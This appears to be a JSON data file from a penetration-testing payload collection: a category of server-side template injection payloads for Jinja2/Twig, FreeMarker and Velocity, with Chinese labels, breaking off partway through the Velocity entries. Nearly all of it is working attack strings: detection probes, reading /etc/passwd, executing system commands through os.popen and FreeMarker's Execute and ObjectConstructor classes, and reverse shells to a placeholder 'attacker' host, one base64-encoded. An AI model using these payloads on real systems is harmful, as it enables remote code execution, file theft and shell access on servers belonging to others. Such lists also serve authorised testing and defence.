    {
      "id": "e801de95-67e4-4700-abd3-c4be228d1c8f",
      "name": "SSTI模板注入",
      "expanded": true,
      "subCategories": [
        {
          "id": "4e079838-a867-4b03-9e44-b0101af21ae5",
          "name": "Jinja2/Twig模板注入",
          "entries": [
            {
              "id": "5a4e2ae9-67bd-4201-96c1-f07f62df0999",
              "title": "payload",
              "payload": "{{7*7}} ${7*7} \u003c%\u003d 7*7 %\u003e {{config}} 如果输出49或配置信息，则存在SSTI\n{{config}} {{self}} {{request}} {{\"\".__class__.__mro__}} {{\"\".__class__.__mro__[1].__subclasses__()}} 收集信息\n{{\u0027\u0027.__class__.__mro__[2].__subclasses__()[40](\u0027/etc/passwd\u0027).read()}} {{config.__class__.__init__.__globals__[\u0027os\u0027].popen(\u0027id\u0027).read()}} {{request.application.__globals__.__builtins__.__import__(\u0027os\u0027).popen(\u0027id\u0027).read()}} 执行系统命令\n{{config.__class__.__init__.__globals__[\u0027os\u0027].popen(\u0027bash -c \"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\"\u0027).read()}} 反弹shell"
            }
          ]
        },
        {
          "id": "63400967-5d37-49bf-9c5d-00cd074f1135",
          "name": "FreeMarker模板注入",
          "entries": [
            {
              "id": "ssti-fm-001",
              "title": "探测SSTI",
              "payload": "${7*7}\n${\"freemarker\"}\n\u003c#assign ex\u003d\"freemarker\"\u003e 输出49/freemarker则存在"
            },
            {
              "id": "ssti-fm-002",
              "title": "信息收集",
              "payload": "${.version}\n${.current_template_name}\n${.lang}\n${system_property[\"java.version\"]}\n${system_property[\"os.name\"]}"
            },
            {
              "id": "ssti-fm-003",
              "title": "命令执行 - new",
              "payload": "\u003c#assign ex\u003d\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"id\")}\n\u003c#assign ex\u003d\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"whoami\")}"
            },
            {
              "id": "ssti-fm-004",
              "title": "命令执行 - api",
              "payload": "\u003c#assign api\u003d\"freemarker.template.utility.ObjectConstructor\"?new()\u003e${api(\"java.lang.Runtime\",\"getRuntime\").exec(\"id\")}\n\u003c#assign api\u003d\"freemarker.template.utility.ObjectConstructor\"?new()\u003e${api(\"java.lang.ProcessBuilder\",\"/bin/sh\",\"-c\",\"id\").start()}"
            },
            {
              "id": "ssti-fm-005",
              "title": "反弹Shell",
              "payload": "\u003c#assign ex\u003d\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA\u003d\u003d}|{base64,-d}|{bash,-i}\")}"
            }
          ]
        },
        {
          "id": "e3a3e9ff-6a0b-48cb-8245-402f4b5ac0c4",
          "name": "Velocity模板注入",
          "entries": [
            {
              "id": "ssti-vt-001",
              "title": "探测SSTI",
              "payload": "#set($x\u003d7*7)$x\n$velocityVersion\n$class.inspect(\"java.lang.Runtime\") 输出49则存在"
            },
            {
              "id": "ssti-vt-002",
              "title": "信息收集",
              "payload": "$class.inspect(\"java.lang.System\")\n$class.inspect(\"java.lang.Runtime\")\n$sys.class.forName(\"java.lang.Runtime\")"
            },
            {
              "id": "ssti-vt-003",
              "title": "命令执行 - ClassTool",
